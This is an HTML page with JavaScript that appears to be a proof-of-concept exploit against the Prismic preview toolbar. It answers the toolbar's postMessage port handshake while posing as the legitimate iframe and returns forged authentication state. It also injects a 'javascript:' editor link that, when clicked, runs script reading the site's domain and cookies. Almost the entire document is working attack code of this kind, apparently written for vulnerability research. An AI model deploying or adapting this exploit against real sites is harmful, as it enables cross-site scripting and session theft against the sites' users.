<!DOCTYPE html>
<html>
<head><title>Prismic Catch</title></head>
<body>
<div id="debug" style="font-family:monospace;font-size:11px;color:#0f0;background:#111;padding:10px;max-height:300px;overflow:auto;"></div>
<script>
// Prismic Toolbar Iframe Hijack — Catch Page (Debug Version)
// ===========================================================

var loadTime = performance.now();
var setupPortReceived = false;
var totalMessages = 0;

// ========== LOCAL DEBUG LOG ==========
function debugLog(msg) {
  var el = document.getElementById('debug');
  if (el) {
    el.innerHTML += '<div>[' + performance.now().toFixed(1) + 'ms] ' + msg + '</div>';
    el.scrollTop = el.scrollHeight;
  }
}

// ========== REPORT TO TOP/OPENER ==========
function report(msg) {
  try { window.top.postMessage({type:'catch_status', msg: msg}, '*'); } catch(e) {}
  try { if (window.opener) window.opener.postMessage({type:'catch_status', msg: msg}, '*'); } catch(e) {}
  debugLog(msg);
}

// ========== CONTEXT INFO ==========
var context = {
  href: location.href,
  name: window.name,
  referrer: document.referrer,
  isIframe: window !== window.top,
  isPopup: !!window.opener,
  parentOrigin: 'unknown',
  topOrigin: 'unknown',
  frameDepth: 0
};
try { context.parentOrigin = window.parent.location.origin; } catch(e) { context.parentOrigin = '(cross-origin)'; }
try { context.topOrigin = window.top.location.origin; } catch(e) { context.topOrigin = '(cross-origin)'; }
try {
  var w = window;
  while (w !== w.parent) { context.frameDepth++; w = w.parent; }
} catch(e) { context.frameDepth = -1; }

report('Catch page loaded! Context: ' + JSON.stringify(context));

// ========== SETUP_PORT CONSTANTS ==========
var SETUP_PORT = 'setup_port';
var READY = 'ready';

// ========== MAIN MESSAGE LISTENER ==========
window.addEventListener('message', function(e) {
  totalMessages++;
  var ts = performance.now().toFixed(1);

  // Build debug info for every message
  var msgInfo = {
    '#': totalMessages,
    time: ts + 'ms',
    origin: e.origin,
    ports: e.ports ? e.ports.length : 0,
    dataType: typeof e.data,
    dataPreview: ''
  };
  try { msgInfo.dataPreview = JSON.stringify(e.data).substring(0, 200); } catch(x) { msgInfo.dataPreview = String(e.data).substring(0, 200); }

  // Source identification
  var source = 'unknown';
  try {
    if (e.source === window.top) source = 'top';
    else if (e.source === window.parent) source = 'parent';
    else if (e.source === window.opener) source = 'opener';
    else if (e.source === null) source = 'null (possibly closed)';
    else source = 'other window';
  } catch(x) { source = 'error: ' + x.message; }
  msgInfo.source = source;

  report('MSG #' + totalMessages + ' from=' + source + ' origin=' + e.origin +
         ' ports=' + msgInfo.ports + ' data=' + msgInfo.dataPreview.substring(0, 100));

  // ========== HANDLE SETUP_PORT ==========
  if (e.data === SETUP_PORT && e.ports && e.ports.length > 0) {
    setupPortReceived = true;
    var port = e.ports[0];
    report('*** SETUP_PORT RECEIVED! *** from=' + source + ' origin=' + e.origin +
           ' at=' + ts + 'ms (load+' + (parseFloat(ts) - loadTime).toFixed(1) + 'ms)');

    // Acknowledge — parent's establishConnection() resolves on 'ready'
    port.postMessage(READY);
    report('Sent READY on port');

    port.onmessage = function(msg) {
      var portTs = performance.now().toFixed(1);
      var type = 'unknown', data = null;
      try {
        type = msg.data.type;
        data = msg.data.data;
      } catch(x) {
        report('Port msg parse error: ' + x.message + ' raw=' + JSON.stringify(msg.data).substring(0, 200));
        return;
      }
      report('PORT MSG type=' + type + ' at=' + portTs + 'ms data=' + JSON.stringify(data).substring(0, 100));

      switch(type) {

        case 'preview_state':
          report('-> Responding auth:true, csrf:hijacked, preview:null');
          port.postMessage({
            type: 'preview_state',
            data: {
              auth: true,
              csrf: 'hijacked',
              preview: null
            }
          });
          break;

        case 'prediction_docs':
          report('-> Responding with javascript: editorUrl (XSS PAYLOAD)');
          port.postMessage({
            type: 'prediction_docs',
            data: [
              {
                editorUrl: 'javascript:void(document.title="XSS_"+document.domain,alert("XSS\\n\\nDomain: "+document.domain+"\\nCookies: "+document.cookie.substring(0,200)))',
                uid: 'xss-poc',
                title: 'Edit this document in Prismic',
                summary: 'Click to open in the Prismic editor',
                type: 'page',
                status: 'draft',
                singleton: false,
                isDocumentLink: false,
                weight: 1,
                urls: [],
                queryTotal: 1,
                updated: Date.now()
              }
            ]
          });
          break;

        case 'dev_mode_queries_results':
          port.postMessage({ type: 'dev_mode_queries_results', data: [] });
          break;

        case 'close_preview_session':
          port.postMessage({ type: 'close_preview_session', data: null });
          break;

        case 'track_toolbar_setup':
          port.postMessage({ type: 'track_toolbar_setup', data: null });
          break;

        case 'track_document_click':
          port.postMessage({ type: 'track_document_click', data: null });
          break;

        case 'update_preview':
          port.postMessage({ type: 'update_preview', data: { reload: false, ref: null } });
          break;

        case 'share_preview':
          port.postMessage({ type: 'share_preview', data: null });
          break;

        default:
          report('-> Unknown type "' + type + '", echoing back with null data');
          port.postMessage({ type: type, data: null });
      }
    };
    return;
  }

  // ========== DETECT FLOOD MESSAGES ==========
  if (typeof e.data === 'string' && e.data.length > 100000) {
    if (totalMessages <= 5 || totalMessages % 100 === 0) {
      report('Flood msg #' + totalMessages + ' (' + (e.data.length / 1024 / 1024).toFixed(1) + 'MB) from=' + source);
    }
    return;
  }
});

// ========== PERIODIC ALIVE BEACON ==========
var beaconCount = 0;
setInterval(function() {
  beaconCount++;
  if (beaconCount <= 10 || beaconCount % 10 === 0) {
    report('Alive beacon #' + beaconCount + ' | msgs=' + totalMessages + ' setup_port=' + setupPortReceived +
           ' uptime=' + (performance.now() - loadTime).toFixed(0) + 'ms');
  }
}, 1000);

// ========== ALSO TRY: Listen on window.name for data passing ==========
if (window.name) {
  report('window.name = "' + window.name + '"');
}

// ========== DETECT IF WE'RE IN A DISPLAY:NONE IFRAME ==========
try {
  if (window.frameElement) {
    var style = window.getComputedStyle(window.frameElement);
    report('frameElement display=' + style.display + ' visibility=' + style.visibility +
           ' width=' + style.width + ' height=' + style.height);
  } else {
    report('frameElement is null (cross-origin parent or top-level)');
  }
} catch(e) {
  report('frameElement check error: ' + e.message);
}
</script>
</body>
</html>
